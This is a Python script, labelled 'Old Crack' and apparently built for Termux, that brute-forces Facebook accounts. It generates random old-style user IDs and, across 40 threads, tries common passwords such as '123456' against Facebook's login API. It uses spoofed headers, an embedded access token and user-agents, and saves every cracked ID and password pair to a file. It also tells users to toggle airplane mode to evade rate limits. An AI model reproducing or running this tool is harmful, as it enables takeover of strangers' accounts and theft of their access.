#Sc By Ghost
#Github: https://github.com/Ghost3987
#Tool Type : Old Crack 
#----------------------------[IMPORT/MODULE]-----------------------------------#
import requests,bs4,json,os,sys,uuid,random,datetime,time,re
import urllib3,rich,base64
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
import os,time,random,json,sys,datetime
try:
    import requests
except:
    os.system("pip3 install requests")
    import requests 
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#-----------------------------[LINE]-----------------------------------#
def lin():
	print("\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m")
#----------------------------[DATE]-----------------------------------#
def joined(uid):
    if len(uid)==15:
        if uid[:10] in ["1000000000"]       :creation = "\33[1;31m| \33[1;36m2009" 
        elif uid[:9] in ["100000000"]       :creation = "\33[1;31m| \33[1;36m2009" 
        elif uid[:8] in ["10000000"]        :creation = "\33[1;31m| \33[1;36m2009" 
        elif uid[:7] in ["1000000","1000001","1000002","1000003","1000004","1000005"]:creation = "\33[1;31m| \33[1;36m2009" 
        elif uid[:7] in ["1000006","1000007","1000008","1000009"]:creation = "\33[1;31m| \33[1;36m2010" 
        elif uid[:6] in ["100001"]          :creation = "\33[1;31m| \33[1;36m2010\33[1;30m/\33[1;33m2011"
        elif uid[:6] in ["100002","100003"] :creation = "\33[1;31m| \33[1;36m2011\33[1;30m/\33[1;33m2012"
        elif uid[:6] in ["100004"]          :creation = "\33[1;31m| \33[1;36m2012\33[1;30m/\33[1;33m2013"
        elif uid[:6] in ["100005","100006"] :creation = "\33[1;31m| \33[1;36m2013\33[1;30m/\33[1;33m2014"
        elif uid[:6] in ["100007","100008"] :creation = "\33[1;31m| \33[1;36m2014\33[1;30m/\33[1;33m2015"
        elif uid[:6] in ["100009"]          :creation = "\33[1;31m| \33[1;36m2015"
        else:creation=""
    elif len(uid) in [9,10]:
        creation = "\33[1;31m| \33[1;36m2008/2009"
    elif len(uid)==8:
        creation = "\33[1;31m| \33[1;36m2007/2008"
    elif len(uid)==7:
        creation = "\33[1;31m| \33[1;36m2006/2007"
    else:creation=''
    return creation
#----------------------------[COLOR/CODE]-----------------------------------#
RED = '\033[1;31m';GREEN = '\033[1;32m';YELLOW = '\033[1;33m';BLUE = '\033[1;34m';PINK = '\033[1;35m';NEON = '\033[1;36m';WHITE = '\033[1;37m';BLACK = '\033[1;30m'
#----------------------------[USER/AGENT]-----------------------------------#
def windows():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])
#----------------------------[LOGO]-----------------------------------#
logo = (f"""        
 _     ___ ____  _   _   _  _____ _   _  ____ 
| |   |_ _|  _ \| | | | | |/ /_ _| \ | |/ ___|
| |    | || |_) | | | | | ' / | ||  \| | |  _ 
| |___ | ||  __/| |_| | | . \ | || |\  | |_| |
|_____|___|_|    \___/  |_|\_\___|_| \_|\____|
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m DEVELOPER   :  GHOST KING
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FACEBOOK    :  G H O S T 
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m GITHUB      :  Ghost3987
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m VERSION     :  4.0
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m TOOL        :  \033[1;34mOld Crack\033[1;32m
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FB GROUP    :  \033[1;91m\033[1;41m\033[1;33mTermux Free Command World 2024\033[;0m\033[1;91m\033[1;92m\033[38;5;46m
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m""")
#----------------------------[MAIN/DEF]-----------------------------------#
def main():
    user=[]
    os.system("clear")
    print(logo)
    print(f'\033[1;31m[\033[1;37m=\033[1;31m] \033[1;37mEXAMPLE    \033[1;33m : \033[1;37m5000/10000/99999')
    lin()
    limit=input(f"\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m INPUT \033[1;31m\033[1;37m: ")
    lin()
    os.system('clear')
    print(logo)
    print(f'\033[1;31m[\033[1;37m1\033[1;31m] \033[1;37m2010-2014 ')
    lin()
    ask=input(f"\033[1;31m[\033[1;37m?\033[1;31m] INPUT \033[1;37m:\033[1;33m ")
    lin()
    if ask in["1"]:
        newrin="10000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,1999999999)))
            user.append(data)
    with ThreadPool(max_workers=40) as Tx:
        os.system('clear')
        print(logo)
        print(f'\x1b[38;5;196m[\x1b[38;5;46m=\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID : {limit} \x1b[38;5;196m')
        print(f'\x1b[38;5;196m[\x1b[38;5;46m+\x1b[38;5;196m]\x1b[38;5;46m TURN \x1b[38;5;196m[\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m]\x1b[38;5;46m AIRPLANE MODE EVERY 3 MIN')
        lin()
        for chin in user:
            uid=newrin+chin
            Tx.submit(login,uid)    
loop=0
oks=[]
def login(uid):
    global oks,loop
    Session=requests.session()
    try:
        king=random.choice([RED,YELLOW,WHITE,GREEN,PINK])
        sys.stdout.write(f'\r{BLACK}[{GREEN}LIPU-KING{BLACK}]{WHITE}-{BLACK}[{YELLOW}{loop}{BLACK}]{WHITE}-{BLACK}[{GREEN}OK{WHITE}:{GREEN}{len(oks)}{BLACK}]{BLUE}')
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": windows(),
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            iloveruna=Session.get("https://api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_GB&client_country_code=GB&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in iloveruna:
                print(f"\r{BLACK}[{king}SUCCESSFUL{BLACK}]{WHITE} {uid} {YELLOW}●{WHITE} {pw}")
                open("/sdcard/LIPU-OLD.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break 
            elif "www.facebook.com" in iloveruna["error_msg"]:              
                print(f"\r{BLACK}[{king}SUCCESS{BLACK}]{WHITE} {uid} {YELLOW}●{WHITE} {pw} "+joined(uid)+" ")
                open("/sdcard/LIPU-OLD.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except:pass
    
main()
#----------------------------[CODE/END]-----------------------------------#